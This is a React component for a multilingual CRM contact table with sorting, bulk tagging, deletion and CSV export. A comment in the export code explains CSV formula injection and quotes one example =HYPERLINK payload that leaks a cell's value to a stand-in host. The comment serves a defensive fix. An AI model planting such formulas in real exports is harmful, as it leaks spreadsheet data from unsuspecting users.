'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { ContactsPager } from '@/components/crm/ContactsPager';
import { toCsvFile } from '@/lib/payments/csv';
import { Input } from '@/components/ui/input';
import { Download, Trash2, Tag, X, Check, ChevronLeft, ChevronRight, ArrowUpDown, ArrowUp, ArrowDown } from 'lucide-react';
import { useLanguage } from '@/lib/business-os/LanguageContext';
import { localizeStageLabel, type StageLanguage } from '@/lib/business-os/stageLabels';
import type { CRMContact } from '@/lib/repositories/CRMContactRepository';
import type { CRMPipelineStage } from '@/lib/repositories/CRMPipelineStagesRepository';

interface CRMContactListProps {
  contacts: CRMContact[];
  stages?: CRMPipelineStage[];
  onContactClick: (contact: CRMContact) => void;
  onContactsUpdated?: () => void;
  // Pagination props
  currentPage?: number;
  totalPages?: number;
  onPageChange?: (page: number) => void;
}


export function CRMContactList({
  contacts,
  stages = [],
  onContactClick,
  onContactsUpdated,
  currentPage = 1,
  totalPages = 1,
  onPageChange
}: CRMContactListProps) {
  const { t, language } = useLanguage();

  /*
   * The stored label, translated the same way the board and the funnel do it.
   *
   * This returned `stage_label` raw — the string onboarding wrote in the
   * business's own language — so a Hebrew pipeline stayed Hebrew in the English
   * list while the board beside it read English.
   */
  /**
   * Two letters to aim at.
   *
   * The first letter of each of the first two words, which works in both
   * scripts without a special case: "שלמה המלך" and "Eyal Omer" both give two.
   * Falls back to the email's first character, then to a dash, because a
   * contact with neither a name nor an address still has to occupy a row.
   */
  const initialsOf = (contact: CRMContact): string => {
    const name = `${contact.first_name ?? ''} ${contact.last_name ?? ''}`.trim();
    if (name) {
      return name
        .split(/\s+/)
        .slice(0, 2)
        .map(word => [...word][0] ?? '')
        .join('');
    }
    return [...(contact.email ?? '-')][0] ?? '-';
  };

  const getStageLabel = (stageKey: string | undefined): string => {
    if (!stageKey) return '-';
    const stage = stages.find(s => s.stage_key === stageKey);
    if (!stage) return stageKey;
    return localizeStageLabel(
      stage.stage_key,
      stage.stage_label,
      language as StageLanguage,
      (stage as { stage_type?: string | null }).stage_type
    );
  };

  /**
   * The badge's own colour, as an inline style.
   *
   * ───────────────────────────────────────────────────────────────────────────
   * THE OWNER'S PIPELINE COLOUR HAS NEVER REACHED THE SCREEN.
   *
   * This returned a Tailwind class built at runtime:
   *
   *     `bg-[${stage.color}]/20 text-[${stage.color}]`
   *
   * Tailwind generates arbitrary values by SCANNING THE SOURCE at build time.
   * A class assembled from a database string exists in no stylesheet, so the
   * badge got a class name with nothing behind it and fell back to the plain
   * surface — identical for every stage. Every custom colour an owner picked
   * was discarded silently, which is why the badges never matched the pipeline.
   *
   * There is no class-based fix: the colours are per-user data. An inline style
   * is the only thing that can carry a value chosen at runtime.
   *
   * The tint is the same hue at 18% against the row, with the full colour as
   * the text, which is what the original intended and never achieved.
   * ───────────────────────────────────────────────────────────────────────────
   */
  const stageTone = (stageKey: string | undefined): { background: string; color: string } => {
    const stage = stageKey ? stages.find(s => s.stage_key === stageKey) : undefined;

    /* `#rrggbb` plus two hex digits of alpha, which every browser in scope
       accepts. Guarded on the shape so a malformed value cannot emit a style
       that paints the badge invisible. */
    if (stage?.color && /^#[0-9a-f]{6}$/i.test(stage.color)) {
      return { background: `${stage.color}2E`, color: stage.color };
    }

    /* No colour stored. The type still carries meaning, so it keeps the
       defaults the pipeline itself uses rather than going grey. */
    const byType: Record<string, string> = {
      lead: '#94a3b8',
      prospect: '#f59e0b',
      client: '#10b981',
      past_client: '#6b7280',
    };
    const fallback = byType[stage?.stage_type ?? ''] ?? '#94a3b8';

    return { background: `${fallback}2E`, color: fallback };
  };
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [showTagInput, setShowTagInput] = useState(false);
  const [bulkTag, setBulkTag] = useState('');
  const [bulkLoading, setBulkLoading] = useState(false);
  const [sortColumn, setSortColumn] = useState<'name' | 'email' | 'phone' | 'stage' | 'updated_at'>('updated_at');
  const [sortDirection, setSortDirection] = useState<'asc' | 'desc'>('desc');

  // Clear selection when contacts change
  useEffect(() => {
    setSelectedIds(new Set());
  }, [contacts]);

  // Sort contacts
  const sortedContacts = [...contacts].sort((a, b) => {
    let comparison = 0;
    switch (sortColumn) {
      case 'name':
        const nameA = `${a.first_name || ''} ${a.last_name || ''}`.toLowerCase().trim();
        const nameB = `${b.first_name || ''} ${b.last_name || ''}`.toLowerCase().trim();
        comparison = nameA.localeCompare(nameB);
        break;
      case 'email':
        comparison = (a.email || '').localeCompare(b.email || '');
        break;
      case 'phone':
        comparison = (a.phone || '').localeCompare(b.phone || '');
        break;
      case 'stage':
        comparison = (a.stage || '').localeCompare(b.stage || '');
        break;
      case 'updated_at':
        comparison = new Date(a.updated_at).getTime() - new Date(b.updated_at).getTime();
        break;
    }
    return sortDirection === 'asc' ? comparison : -comparison;
  });

  const handleSort = (column: typeof sortColumn) => {
    if (sortColumn === column) {
      setSortDirection(prev => prev === 'asc' ? 'desc' : 'asc');
    } else {
      setSortColumn(column);
      setSortDirection('asc');
    }
  };

  const SortIcon = ({ column }: { column: typeof sortColumn }) => {
    if (sortColumn !== column) {
      return <ArrowUpDown className="h-3 w-3 opacity-50" />;
    }
    return sortDirection === 'asc'
      ? <ArrowUp className="h-3 w-3" />
      : <ArrowDown className="h-3 w-3" />;
  };

  const formatTimeAgo = (date: string) => {
    const seconds = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
    if (seconds < 60) return t('crm.pipeline.just_now');
    if (seconds < 3600) return `${Math.floor(seconds / 60)} ${t('crm.table.min_ago')}`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)} ${t('crm.table.hours_ago')}`;
    if (seconds < 604800) return `${Math.floor(seconds / 86400)} ${t('crm.table.days_ago')}`;

    /*
     * A SHORT DATE, IN THE READER'S LANGUAGE.
     *
     * ─────────────────────────────────────────────────────────────────────────
     * This was a bare `toLocaleDateString()`, which takes the BROWSER's locale
     * rather than the one the page is being read in, and renders
     * `06/10/2026` — eight heavy digits whose day and month cannot be told
     * apart, sitting in a column whose other rows say "19 שעות".
     *
     * `6 באוק׳` is the form every other date in the product uses, and it reads
     * as the same kind of fact as the relative ones above it.
     *
     * The year appears only when it is not this one. Printing it on every row
     * costs four characters to tell the reader something they already know, and
     * the column is the narrowest on the table.
     * ─────────────────────────────────────────────────────────────────────────
     */
    const when = new Date(date);
    const locale = language === 'he' ? 'he-IL' : language === 'es' ? 'es-ES' : 'en-US';

    return when.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'short',
      ...(when.getFullYear() === new Date().getFullYear() ? {} : { year: 'numeric' }),
    });
  };

  const toggleSelect = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    setSelectedIds(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) {
        newSet.delete(id);
      } else {
        newSet.add(id);
      }
      return newSet;
    });
  };

  const toggleSelectAll = () => {
    if (selectedIds.size === contacts.length) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(new Set(contacts.map(c => c.id)));
    }
  };

  const handleBulkExport = () => {
    const selectedContacts = contacts.filter(c => selectedIds.has(c.id));
    if (selectedContacts.length === 0) return;

    const headers = [
      t('crm.export.first_name'),
      t('crm.export.last_name'),
      t('crm.export.email'),
      t('crm.export.phone'),
      t('crm.export.stage'),
      t('crm.export.source'),
      t('crm.export.tags'),
      t('crm.export.created_at')
    ];

    const rows = selectedContacts.map(contact => [
      contact.first_name || '',
      contact.last_name || '',
      contact.email || '',
      contact.phone || '',
      contact.stage || '',
      contact.source || '',
      (contact.tags || []).join('; '),
      /* ISO, not `toLocaleDateString()`. That took the BROWSER's locale and
         wrote `06/10/2026`, whose day and month cannot be told apart by the
         person opening the file or by the spreadsheet importing it.
         `2026-10-06` is unambiguous and sorts as text. */
      contact.created_at ? new Date(contact.created_at).toISOString().slice(0, 10) : ''
    ]);

    /*
     * `toCsvFile`, not a hand-rolled quote.
     *
     * ─────────────────────────────────────────────────────────────────────────
     * This built its rows as `"${String(cell).replace(/"/g, '""')}"`, which is
     * correct CSV and no defence at all: a spreadsheet evaluates a cell whose
     * value begins `=`, `+`, `-` or `@` after the quotes are parsed away.
     *
     * And this export is the worst place for it. `first_name`, `last_name`,
     * `email` and `phone` are written by `POST /api/website/forms/contact`,
     * which takes NO authentication — it is the public contact form on the
     * business's own site. A stranger whose first name is
     * `=HYPERLINK("https://example.invalid/?x="&A1,"Invoice")` gets that
     * formula into the owner's spreadsheet, and the owner clicked "Export".
     *
     * The serialiser also keeps the BOM, which is what makes Excel read the
     * Hebrew names as Hebrew.
     * ─────────────────────────────────────────────────────────────────────────
     */
    const blob = new Blob([toCsvFile([headers, ...rows])], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `contacts_selected_${new Date().toISOString().split('T')[0]}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(link.href);

    setSelectedIds(new Set());
  };

  const handleBulkTag = async () => {
    if (!bulkTag.trim() || selectedIds.size === 0) return;

    setBulkLoading(true);
    try {
      const promises = Array.from(selectedIds).map(id => {
        const contact = contacts.find(c => c.id === id);
        if (!contact) return Promise.resolve();

        const existingTags = contact.tags || [];
        if (existingTags.includes(bulkTag.trim())) return Promise.resolve();

        return fetch(`/api/crm/contacts/${id}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ tags: [...existingTags, bulkTag.trim()] })
        });
      });

      await Promise.all(promises);
      setBulkTag('');
      setShowTagInput(false);
      setSelectedIds(new Set());
      onContactsUpdated?.();
    } catch (error) {
      console.error('Failed to add tag:', error);
    } finally {
      setBulkLoading(false);
    }
  };

  const handleBulkDelete = async () => {
    if (selectedIds.size === 0) return;
    if (!confirm(t('crm.bulk.delete_confirm').replace('{count}', String(selectedIds.size)))) return;

    setBulkLoading(true);
    try {
      const responses = await Promise.all(
        Array.from(selectedIds).map(id =>
          fetch(`/api/crm/contacts/${id}`, { method: 'DELETE' })
        )
      );

      /*
       * Say so when some of them did not go.
       *
       * This used to await the requests and then clear the selection whatever
       * came back, so a client who could not be deleted — one the business has
       * been paid by, which the route now refuses with a 409 — vanished from the
       * list and was back on the next load, with nothing said. The drawer had
       * the same silence; between them they hid a bug for weeks.
       */
      const refused = responses.filter(response => !response.ok).length;
      if (refused > 0) {
        alert(t('crm.bulk.delete_partial').replace('{count}', String(refused)));
      }

      setSelectedIds(new Set());
      onContactsUpdated?.();
    } catch (error) {
      console.error('Failed to delete contacts:', error);
    } finally {
      setBulkLoading(false);
    }
  };

  const selectedCount = selectedIds.size;

  return (
    <div>
      <div className="bg-[var(--v2-surface)] border border-[var(--v2-border)] overflow-hidden" style={{ borderRadius: (totalPages > 1 && onPageChange) ? 'var(--v2-radius-card) var(--v2-radius-card) 0 0' : 'var(--v2-radius-card)' }}>
        <div className="overflow-x-auto">
          <table className="w-full" style={{ fontFamily: 'var(--font-sans, "Heebo", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif)' }}>
            <thead className="bg-[var(--v2-bg)] border-b border-[var(--v2-border)]">
              <tr>
                <th className="px-2 py-2.5 text-start sm:px-4">
                  <input
                    type="checkbox"
                    checked={contacts.length > 0 && selectedIds.size === contacts.length}
                    onChange={toggleSelectAll}
                    className="rounded border-[var(--v2-border)] text-[#8B5CF6] focus:ring-[#8B5CF6]"
                  />
                </th>
                <th
                  className="whitespace-nowrap px-2 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:px-4"
                  onClick={() => handleSort('name')}
                >
                  <div className="flex items-center gap-1">
                    {t('crm.table.name')}
                    <SortIcon column="name" />
                  </div>
                </th>
                <th
                  className="hidden whitespace-nowrap px-4 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:table-cell"
                  onClick={() => handleSort('phone')}
                >
                  <div className="flex items-center gap-1">
                    {t('crm.table.phone')}
                    <SortIcon column="phone" />
                  </div>
                </th>
                <th
                  className="whitespace-nowrap px-2 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:px-4"
                  onClick={() => handleSort('stage')}
                >
                  <div className="flex items-center gap-1">
                    {t('crm.table.stage')}
                    <SortIcon column="stage" />
                  </div>
                </th>
                {/*
                  Tags keep their column, but not their dashes.
                  ──────────────────────────────────────────────
                  It previously rendered "-" on every row for an account with no
                  tags at all, spending a seventh of the width to say nothing.
                  An empty cell says the same thing and says it quietly.

                  Hidden below `md`: on a phone it is the first thing worth
                  dropping, since a tag is a filter you apply rather than a fact
                  you scan for.
                */}
                <th className="hidden whitespace-nowrap px-2 py-2.5 text-start text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider md:table-cell md:px-4">
                  {t('crm.table.tags')}
                </th>
                <th
                  className="whitespace-nowrap px-2 py-2.5 text-end text-xs font-medium text-[var(--v2-text-muted)] uppercase tracking-wider cursor-pointer transition-colors hover:text-[var(--v2-text-primary)] sm:px-4"
                  onClick={() => handleSort('updated_at')}
                >
                  <div className="flex items-center justify-end gap-1">
                    {t('crm.table.last_contact')}
                    <SortIcon column="updated_at" />
                  </div>
                </th>
              </tr>
            </thead>
            <tbody className="bg-[var(--v2-surface)] divide-y divide-[var(--v2-border)]">
              {sortedContacts.map(contact => (
                <tr
                  key={contact.id}
                  onClick={() => onContactClick(contact)}
                  className={`hover:bg-[var(--v2-surface-hover)] cursor-pointer transition-colors ${
                    selectedIds.has(contact.id) ? 'bg-[#8B5CF6]/5' : ''
                  }`}
                >
                  <td className="px-2 py-2 sm:px-4" onClick={(e) => toggleSelect(contact.id, e)}>
                    <input
                      type="checkbox"
                      checked={selectedIds.has(contact.id)}
                      onChange={() => {}}
                      className="rounded border-[var(--v2-border)] text-[#8B5CF6] focus:ring-[#8B5CF6]"
                    />
                  </td>

                  {/*
                    WHO, as one cell.
                    ─────────────────
                    The name and the email were two columns of equal weight, and
                    nobody scans a list of email addresses: they look for a
                    person and read the address once they have found them. One
                    cell, the name leading and the address beneath it, gives the
                    eye a single thing to track down the column.

                    The initials are a target to aim at. In a list of Hebrew
                    names at one size and one weight there was nothing to fix on.
                  */}
                  {/*
                    `max-w-0` is what makes the truncation work.

                    A table cell sizes to its content, so `min-w-0` and
                    `truncate` inside it do nothing on their own: the cell simply
                    grows and pushes the stage and the date off the screen. Zero
                    maximum width lets it absorb whatever the nowrap columns
                    leave, and the long email ellipsises instead of widening the
                    table.
                  */}
                  <td className="w-full max-w-0 px-2 py-2 sm:px-4">
                    <div className="flex min-w-0 items-center gap-2.5">
                      <span
                        aria-hidden
                        className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full text-[11px] font-bold"
                        style={stageTone(contact.stage)}
                      >
                        {initialsOf(contact)}
                      </span>
                      <div className="min-w-0">
                        <div className="truncate text-sm font-semibold text-[var(--v2-text-primary)]">
                          {contact.first_name} {contact.last_name}
                        </div>
                        {/*
                          One secondary line, whatever the width. On a phone it
                          carries the number too, because the column holding it
                          is hidden there and a contact row without a way to
                          reach the person is just a name.
                        */}
                        {(contact.email || contact.phone) && (
                          <div className="truncate text-xs text-[var(--v2-text-muted)]">
                            {contact.phone && (
                              <span className="sm:hidden">
                                <bdi className="tabular-nums">{contact.phone}</bdi>
                                {contact.email ? ' · ' : ''}
                              </span>
                            )}
                            {contact.email}
                          </div>
                        )}
                      </div>
                    </div>
                  </td>

                  {/*
                    THE NUMBER, PROTECTED.
                    ──────────────────────
                    `+1 201 364 3030` was rendering as `12013643030+` for every
                    Hebrew reader. The raw string sits in a right-to-left row,
                    the bidi algorithm reads the leading `+` as a neutral and
                    reorders it to the other end. `<bdi>` isolates the run so it
                    keeps its own direction.

                    Tabular figures so the digits line up down the column, which
                    is the only reason to put numbers in a column at all.
                  */}
                  {/*
                    Its own column on a laptop, folded into the line above on a
                    phone. A five-column table on a 390px screen scrolls
                    sideways, and a horizontally scrolling list is one people
                    stop scrolling: the columns past the fold may as well not
                    exist.
                  */}
                  <td className="hidden px-2 py-2 whitespace-nowrap sm:table-cell sm:px-4">
                    {contact.phone ? (
                      <bdi className="text-[13px] tabular-nums text-[var(--v2-text-secondary)]">
                        {contact.phone}
                      </bdi>
                    ) : (
                      <span className="text-[var(--v2-text-muted)]">&nbsp;</span>
                    )}
                  </td>

                  <td className="px-2 py-2 sm:px-4">
                    <div className="flex flex-wrap items-center gap-1">
                      <span
                        className="inline-flex items-center rounded-full px-2 py-0.5 text-xs font-semibold whitespace-nowrap"
                        style={stageTone(contact.stage)}
                      >
                        {getStageLabel(contact.stage)}
                      </span>

                    </div>
                  </td>

                  <td className="hidden px-2 py-2 md:table-cell md:px-4">
                    <div className="flex flex-wrap items-center gap-1">
                      {contact.tags?.slice(0, 2).map(tag => (
                        <span
                          key={tag}
                          className="inline-flex items-center whitespace-nowrap rounded-full border border-[var(--v2-border)] px-1.5 py-0.5 text-[11px] text-[var(--v2-text-secondary)]"
                        >
                          {tag}
                        </span>
                      ))}
                      {(contact.tags?.length ?? 0) > 2 && (
                        <span className="text-[11px] text-[var(--v2-text-muted)]">
                          +{(contact.tags?.length ?? 0) - 2}
                        </span>
                      )}
                    </div>
                  </td>

                  <td className="px-2 py-2 text-end whitespace-nowrap sm:px-4">
                    <span className="text-xs text-[var(--v2-text-muted)]">
                      {formatTimeAgo(contact.updated_at)}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>

          {contacts.length === 0 && (
            <div className="text-center py-12 text-[var(--v2-text-muted)]">
              {t('crm.table.no_contacts')}
            </div>
          )}
        </div>
      </div>

      {/* Pagination Controls */}
      {/* The same pager the board uses — see components/crm/ContactsPager.tsx.
          It lived here, which is why the kanban had none. */}
      {onPageChange && (
        <ContactsPager
          currentPage={currentPage}
          totalPages={totalPages}
          onPageChange={onPageChange}
          t={t}
          attached
        />
      )}

      {/* Floating Bulk Actions Bar */}
      {selectedCount > 0 && (
        <div
          className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 flex items-center gap-3 px-6 py-3 bg-[var(--v2-surface)] border border-[var(--v2-border)] shadow-xl"
          style={{ borderRadius: 'var(--v2-radius-card)' }}
        >
          <span className="text-sm font-medium text-[var(--v2-text-primary)]">
            {t('crm.bulk.selected').replace('{count}', String(selectedCount))}
          </span>

          <div className="w-px h-6 bg-[var(--v2-border)]" />

          {/* Tag Input */}
          {showTagInput ? (
            <div className="flex items-center gap-2">
              <Input
                value={bulkTag}
                onChange={(e) => setBulkTag(e.target.value)}
                placeholder={t('crm.bulk.tag_placeholder')}
                className="w-32 h-8 text-sm bg-[var(--v2-bg)]"
                onKeyDown={(e) => e.key === 'Enter' && handleBulkTag()}
                disabled={bulkLoading}
              />
              <Button
                size="sm"
                onClick={handleBulkTag}
                disabled={!bulkTag.trim() || bulkLoading}
                className="h-8 px-2 text-[#8B5CF6] border border-[#8B5CF6] bg-[#8B5CF6]/10 hover:bg-[#8B5CF6]/20"
              >
                <Check className="h-4 w-4" />
              </Button>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => { setShowTagInput(false); setBulkTag(''); }}
                className="h-8 px-2"
              >
                <X className="h-4 w-4" />
              </Button>
            </div>
          ) : (
            <>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => setShowTagInput(true)}
                className="h-8 gap-1.5 text-[#8B5CF6] hover:bg-[#8B5CF6]/10"
                disabled={bulkLoading}
              >
                <Tag className="h-4 w-4" />
                {t('crm.bulk.add_tag')}
              </Button>

              <Button
                size="sm"
                variant="ghost"
                onClick={handleBulkExport}
                className="h-8 gap-1.5 text-[#8B5CF6] hover:bg-[#8B5CF6]/10"
                disabled={bulkLoading}
              >
                <Download className="h-4 w-4" />
                {t('crm.bulk.export')}
              </Button>

              <Button
                size="sm"
                variant="ghost"
                onClick={handleBulkDelete}
                className="h-8 gap-1.5 text-red-500 hover:text-red-600 hover:bg-red-500/10"
                disabled={bulkLoading}
              >
                <Trash2 className="h-4 w-4" />
                {t('crm.bulk.delete')}
              </Button>
            </>
          )}

          <div className="w-px h-6 bg-[var(--v2-border)]" />

          <Button
            size="sm"
            variant="ghost"
            onClick={() => setSelectedIds(new Set())}
            className="h-8 px-2 text-[var(--v2-text-muted)]"
          >
            <X className="h-4 w-4" />
          </Button>
        </div>
      )}
    </div>
  );
}
